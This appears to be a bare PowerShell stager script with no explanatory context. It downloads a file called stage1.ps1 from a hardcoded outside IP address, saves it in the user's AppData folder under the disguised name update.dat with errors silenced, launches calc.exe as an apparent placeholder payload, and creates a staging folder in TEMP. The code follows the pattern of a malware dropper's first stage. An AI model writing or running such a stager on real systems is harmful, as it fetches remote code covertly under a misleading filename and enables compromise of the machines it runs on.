$Stage1Url = 'http://203.0.113.240/stage1.ps1'
$DownloadPath = "$env:APPDATA\update.dat"
$ConnectionTimeout = 119
Invoke-WebRequest -Uri $Stage1Url -OutFile $DownloadPath -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
